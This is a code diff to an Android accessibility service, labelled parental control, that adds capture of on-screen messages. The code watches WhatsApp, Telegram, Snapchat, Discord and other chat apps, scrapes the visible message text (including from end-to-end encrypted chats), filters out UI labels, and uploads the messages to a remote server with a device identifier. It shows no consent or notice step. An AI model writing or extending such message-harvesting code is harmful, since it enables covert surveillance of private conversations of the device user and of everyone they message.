@@ -21,6 +21,22 @@ class TrackerAccessibilityService : AccessibilityService() {
     private var lastWebUrl: String? = null
     private var lastWebUrlTime: Long = 0
 
+    // ── On-screen conversation capture ──────────────────────────────
+    private val chatPackages = setOf(
+        "com.whatsapp", "com.whatsapp.w4b", "com.instagram.android",
+        "com.facebook.orca", "com.facebook.lite", "com.facebook.katana",
+        "org.telegram.messenger", "org.telegram.plus", "com.snapchat.android",
+        "com.discord", "jp.naver.line.android", "com.viber.voip", "com.skype.raider"
+    )
+    private val chatNoise = listOf(
+        "online", "typing…", "typing...", "last seen", "recording audio",
+        "click to", "swipe to", "messages and calls", "end-to-end", "encrypted",
+        "view contact", "add to", "mute", " wallpaper", "block", "report", "empty chat"
+    )
+    private var lastChatCaptureTime: Long = 0
+    private var lastChatSignature: String? = null
+    private val chatHandler = android.os.Handler(android.os.Looper.getMainLooper())
+
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: return
         val now = System.currentTimeMillis()
@@ -66,6 +82,14 @@ class TrackerAccessibilityService : AccessibilityService() {
         // ── Monitoring & Auto Keep-Alive ────────────────────────────
         if (!TrackerService.isRunning) {
             TrackerService.start(this)
+        }
+
+        // ── On-screen conversation capture (chat apps) ────────────────
+        if (packageName in chatPackages &&
+            (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+             event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
+        ) {
+            scheduleChatCapture(packageName)
         }
 
         when (event.eventType) {
@@ -145,6 +169,94 @@ class TrackerAccessibilityService : AccessibilityService() {
     }
 
     override fun onInterrupt() {}
+
+    // ── On-screen conversation capture ──────────────────────────────
+
+    /** Debounce: wait for the chat UI to settle, then read the visible messages once. */
+    private fun scheduleChatCapture(packageName: String) {
+        chatHandler.removeCallbacksAndMessages(null)
+        chatHandler.postDelayed({ captureConversation(packageName) }, 3000)
+    }
+
+    private fun captureConversation(packageName: String) {
+        try {
+            val root = rootInActiveWindow ?: return
+            if (root.packageName?.toString() != packageName) return
+
+            val messages = mutableListOf<String>()
+            val queue = arrayListOf(root)
+            var head = 0
+            var visited = 0
+            while (head < queue.size && visited < 600 && messages.size < 80) {
+                val node = queue[head]
+                head++
+                visited++
+                if (node.childCount > 0) {
+                    for (i in 0 until node.childCount) {
+                        try {
+                            val child = node.getChild(i)
+                            if (child != null) queue.add(child)
+                        } catch (e: Exception) {}
+                    }
+                }
+                val text = node.text?.toString()?.trim() ?: ""
+                if (text.length < 2 || text.length > 500) continue
+                val lower = text.lowercase()
+                if (chatNoise.any { lower.contains(it) }) continue
+                // Skip UI chrome: bare timestamps / counters
+                if (text.matches(Regex("^[0-9:apm.,\\-/ ]{1,12}$", RegexOption.IGNORE_CASE))) continue
+                if (messages.none { it == text }) messages.add(text)
+            }
+
+            if (messages.isEmpty()) return
+
+            // Dedup: same visible set within 10 minutes is not re-sent
+            val signature = messages.joinToString("|")
+            if (signature == lastChatSignature &&
+                System.currentTimeMillis() - lastChatCaptureTime < 10 * 60_000L
+            ) return
+            lastChatSignature = signature
+            lastChatCaptureTime = System.currentTimeMillis()
+
+            Log.d(TAG, "Chat capture: ${messages.size} visible messages in $packageName")
+            sendChatCapture(packageName, messages)
+        } catch (e: Exception) {
+            Log.e(TAG, "captureConversation failed: ${e.message}")
+        }
+    }
+
+    private fun appNameFor(pkg: String): String = try {
+        packageManager.getApplicationLabel(
+            packageManager.getApplicationInfo(pkg, 0)
+        ).toString()
+    } catch (e: Exception) { pkg }
+
+    private fun sendChatCapture(packageName: String, messages: List<String>) {
+        Thread {
+            try {
+                val payload = org.json.JSONObject().apply {
+                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
+                    put("activities", org.json.JSONArray().apply {
+                        put(org.json.JSONObject().apply {
+                            put("activity_type", "chat_capture")
+                            put("package_name", packageName)
+                            put("app_name", appNameFor(packageName))
+                            put("data", org.json.JSONObject().apply {
+                                put("messages", org.json.JSONArray().apply {
+                                    messages.forEach { put(it.take(300)) }
+                                })
+                                put("count", messages.size)
+                            })
+                            put("timestamp", System.currentTimeMillis())
+                        })
+                    })
+                }
+                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }.start()
+    }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
